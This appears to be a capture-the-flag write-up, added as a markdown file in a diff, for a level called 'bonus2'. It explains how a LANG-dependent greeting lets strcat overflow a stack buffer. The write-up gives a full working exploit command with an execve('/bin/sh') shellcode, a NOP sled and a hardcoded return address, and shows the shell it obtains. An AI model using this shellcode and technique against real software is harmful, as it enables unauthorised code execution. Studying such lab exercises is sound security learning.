@@ -1,0 +1,195 @@
+# Bonus2 - Buffer Overflow (Language Environment Variable)
+
+## Context
+
+The program takes two arguments, copies them into stack buffers, then calls `greetuser()` which uses `strcat` without size check. The greeting language is controlled by the `LANG` environment variable — different languages produce different greeting lengths, changing the overflow offset.
+
+---
+
+## Program Flow
+
+```c
+main(argc, argv) :
+  strncpy(local_60, argv[1], 0x28)   // copies 40 bytes max
+  strncpy(acStack_38, argv[2], 0x20) // copies 32 bytes max
+  LANG = getenv("LANG")
+  if LANG == "fi" → language = 1     // Finnish
+  if LANG == "nl" → language = 2     // Dutch
+  memcpy(greetuser_buf, local_60, 76)
+  greetuser()
+
+greetuser() :
+  if language == 1 → greeting = "Hyvää päivää " (18 bytes)
+  if language == 2 → greeting = "Goedemiddag! " (13 bytes)
+  if language == 0 → greeting = "Hello "        (6 bytes)
+  strcat(local_4c, greeting + argv[1])           // overflow !
+  puts(local_4c)
+```
+
+---
+
+## The Vulnerability
+
+### greetuser() stack layout
+
+```c
+char local_4c[4];     // greeting start
+undefined4 local_48;  // greeting continuation
+char local_44[64];    // greeting rest
+```
+
+In reality this is one contiguous buffer of **72 bytes** :
+
+```
+local_4c [4 bytes] + local_48 [4 bytes] + local_44 [64 bytes] = 72 bytes total
+```
+
+### Why strcat overflows
+
+```c
+strcat(local_4c, argv1_copy)
+```
+
+```
+greeting  = up to 18 bytes  (Finnish)
+argv1     = up to 40 bytes  (strncpy limit)
+total     = 58 bytes into 72 byte buffer
+
+return address is just after the buffer !
+```
+
+---
+
+## Stack Layout in greetuser()
+
+```
+local_4c [72 bytes buffer]
+saved ebp [4 bytes]
+return address [4 bytes]   ← we overwrite this
+```
+
+### Distance from buffer start to return address
+
+```
+72 bytes (buffer) + 4 bytes (saved ebp) = 76 bytes
+```
+
+---
+
+## Why LANG=fi Matters
+
+Different languages produce different greeting lengths :
+
+```
+language 0 (default) : "Hello "         =  6 bytes
+language 2 (nl)      : "Goedemiddag! "  = 13 bytes
+language 1 (fi)      : "Hyvää päivää " = 18 bytes  ← longest !
+```
+
+With Finnish greeting (18 bytes) :
+
+```
+18 (greeting) + argv[1] content = total written by strcat
+
+return address offset from argv[1] :
+76 - 18 = 58 bytes into argv[1]
+
+argv[1] is strncpy'd to 40 bytes max
+→ 40 bytes of argv[1] reach into greetuser buffer
+→ 58 - 40 = 18 bytes still needed
+→ these come from argv[2] via the memcpy !
+```
+
+---
+
+## Finding the Offset
+
+```
+buffer total      = 72 bytes
+greeting (fi)     = 18 bytes
+argv[1] max       = 40 bytes  (strncpy limit 0x28)
+argv[2] max       = 32 bytes  (strncpy limit 0x20)
+
+bytes before return addr = 76
+greeting fills    = 18 bytes
+argv[1] fills     = 40 bytes
+total so far      = 58 bytes
+remaining         = 76 - 58 = 18 bytes → come from argv[2] !
+
+return address offset in argv[2] = 18 bytes
+```
+
+---
+
+## NOP Sled Strategy
+
+The shellcode is placed in argv[1] which gets copied to the stack :
+
+```
+argv[1] = NOP * 200 + shellcode
+strncpy copies 40 bytes → first 40 NOPs on stack
+rest of NOP sled + shellcode remain in argv[1] memory on stack !
+```
+
+```
+stack during greetuser() :
+0xbffff840 : NOP sled (from argv[1] original location)
+...
+0xbffff840 + 200 = shellcode
+
+target = 0xbffff840  ← somewhere in NOP sled
+```
+
+---
+
+## Final Payload
+
+```bash
+LANG=fi ./bonus2 \
+  $(python -c "print('\x90'*200 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')") \
+  $(python -c "print('A'*18 + '\x40\xf8\xff\xbf')")
+```
+
+### Payload breakdown
+
+```
+argv[1] :
+  \x90 * 200        →  NOP sled on stack
+  shellcode 24b     →  execve("/bin/sh")
+  strncpy keeps 40 bytes → NOPs in greetuser buffer
+
+argv[2] :
+  'A' * 18          →  fills up to return address offset
+  \x40\xf8\xff\xbf  →  0xbffff840 in little endian
+                    →  address in NOP sled
+```
+
+---
+
+## Full Execution Flow
+
+```
+1. main()       → strncpy argv[1] (40b) and argv[2] (18b+addr) to stack
+2. LANG=fi      → language = 1 → Finnish greeting = 18 bytes
+3. greetuser()  → strcat("Hyvää päivää ", argv1_copy)
+                  18 + 40 = 58 bytes written
+4. strcat       → continues with argv[2] content
+                  A*18 + address = 22 bytes
+                  total = 58 + 22 = 80 bytes → overflows 72 byte buffer !
+                  overwrites saved ebp + return address
+5. ret          → jumps to 0xbffff840
+6. NOP sled     → CPU slides through NOPs
+7. shellcode    → execve("/bin/sh")
+8.              → shell !
+```
+
+---
+
+## Result
+
+```bash
+LANG=fi ./bonus2 $(python -c "print('\x90'*200 + shellcode)") $(python -c "print('A'*18 + '\x40\xf8\xff\xbf')")
+Hyvää päivää ����...AAAAAAAAAAAAAAAAAA@���
+$ whoami
+bonus3    ← shell obtained !
+```
